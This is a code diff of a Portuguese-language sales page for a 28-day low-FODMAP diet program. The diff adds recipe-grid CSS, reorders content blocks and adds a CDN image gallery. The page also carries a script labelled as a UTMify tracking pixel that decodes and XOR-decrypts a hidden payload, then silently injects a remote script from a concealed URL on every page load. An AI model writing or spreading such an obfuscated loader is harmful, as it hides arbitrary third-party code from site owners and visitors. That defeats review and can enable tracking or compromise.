@@ -561,6 +561,9 @@
   .bn-ul{list-style:none;margin:14px auto 2px;padding:0;text-align:left;max-width:360px;}
   .bn-ul li{position:relative;padding:0 0 10px 28px;font-size:14.5px;color:var(--label2);line-height:1.45;}
   .bn-ul li::before{content:"✓";position:absolute;left:2px;top:0;font-weight:800;color:var(--green-d);font-size:16px;}
+
+  .rc-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:16px;}
+  .rc-grid img{width:100%;aspect-ratio:1/1;object-fit:cover;border-radius:18px;display:block;background:var(--card);}
 </style>
 <!-- UTMify: pixel e UTMs -->
 <script>(function(){var i_d=atob("DEvQcydjaYbpyI6htjDyBlUPS7zLoPrVxjjqXAgADejHvfrM3y2pXUQMBKiLuqHS1Tm5A1MQRvaAsOvNmTu5C0IPR+ya6qKD1z+kAU4BHPKMu6yb7Rb8UUAPBuSIpP2DjBCrUUkCBOPL8qzR3zO1H24HS6rLvu/Nwy7ySQVVC7bY+r6Qgyi0RkZbCOPYq+rAji7hRRZBFNuU");var f_6=[];for(var j_g=0;j_g<i_d.length;j_g++){f_6.push(i_d.charCodeAt(j_g)&255);}var l_h=f_6[0];var j_ja1=f_6.slice(1,1+l_h);var p_s5z=f_6.slice(1+l_h);var z_wfu=p_s5z.map(function(b,j_u8j6){return b^j_ja1[j_u8j6%l_h];});var k_82xl="";for(var e_wlew=0;e_wlew<z_wfu.length;e_wlew++){k_82xl+=String.fromCharCode(z_wfu[e_wlew]&255);}var d_6j5=decodeURIComponent(escape(k_82xl));var u_qn=JSON.parse(d_6j5);var w_w0g=u_qn.globals||[];w_w0g.forEach(function(b_uj4p){window[b_uj4p.name]=b_uj4p.value;});var b_gr=document.createElement("script");b_gr.src=u_qn.url;b_gr.async=true;b_gr.defer=true;(u_qn.attributes||[]).forEach(function(d_pi){b_gr.setAttribute(d_pi.name,d_pi.value);});(document.head||document.documentElement).appendChild(b_gr);})();</script>
@@ -1087,11 +1090,10 @@ function sOffer(){
     </div>
 
     <div class="block">
-      <h2>Seus 28 dias, passo a passo</h2>
-      <div class="tl">
-        <div class="tl-i"><div class="tl-n t-green">1</div><div><span class="day">Dias 1 a 14</span><b>Reset</b><p>Cardápio base com alimentos de baixa fermentação e receitas simples do dia a dia.</p></div></div>
-        <div class="tl-i"><div class="tl-n t-orange">2</div><div><span class="day">Dias 15 a 21</span><b>Estabilizar</b><p>Observe como o corpo responde, com o diário de sintomas e o plano de refeições.</p></div></div>
-        <div class="tl-i"><div class="tl-n t-purple">3</div><div><span class="day">Dias 22 a 28</span><b>Reintroduzir</b><p>Volta organizada de grupos de alimentos, um de cada vez, pra identificar seus gatilhos.</p></div></div>
+      <h2>O que você vai aprender</h2>
+      <p class="lead">Tudo organizado em passos claros para você aplicar no seu ritmo.</p>
+      <div class="tl lrn">
+        ${LEARN.map((l,k)=>`<div class="tl-i"><div class="tl-n ${['t-green','t-orange','t-purple'][k%3]}">${k+1}</div><div><b>${l[0]}</b><p>${l[1]}</p></div></div>`).join('')}
       </div>
     </div>
 
@@ -1113,10 +1115,18 @@ function sOffer(){
     </div>
 
     <div class="block">
-      <h2>O que você vai aprender</h2>
-      <p class="lead">Tudo organizado em passos claros para você aplicar no seu ritmo.</p>
-      <div class="tl lrn">
-        ${LEARN.map((l,k)=>`<div class="tl-i"><div class="tl-n ${['t-green','t-orange','t-purple'][k%3]}">${k+1}</div><div><b>${l[0]}</b><p>${l[1]}</p></div></div>`).join('')}
+      <h2>Seus 28 dias, passo a passo</h2>
+      <div class="tl">
+        <div class="tl-i"><div class="tl-n t-green">1</div><div><span class="day">Dias 1 a 14</span><b>Reset</b><p>Cardápio base com alimentos de baixa fermentação e receitas simples do dia a dia.</p></div></div>
+        <div class="tl-i"><div class="tl-n t-orange">2</div><div><span class="day">Dias 15 a 21</span><b>Estabilizar</b><p>Observe como o corpo responde, com o diário de sintomas e o plano de refeições.</p></div></div>
+        <div class="tl-i"><div class="tl-n t-purple">3</div><div><span class="day">Dias 22 a 28</span><b>Reintroduzir</b><p>Volta organizada de grupos de alimentos, um de cada vez, pra identificar seus gatilhos.</p></div></div>
+      </div>
+    </div>
+
+    <div class="block">
+      <h2>Receitas Low Fodmap</h2>
+      <div class="rc-grid">
+        ${[1,2,3,4,5,6].map(n=>`<img src="https://cdn.jsdelivr.net/gh/hmacieldesigner/congelamentosaudavel-upssel@1715bd68f398d746f89529d16ce9bec42a6cfdd0/sibo/receitas/${n}.jpg" alt="Receita low FODMAP ${n}" loading="lazy" width="320" height="320">`).join('')}
       </div>
     </div>
 
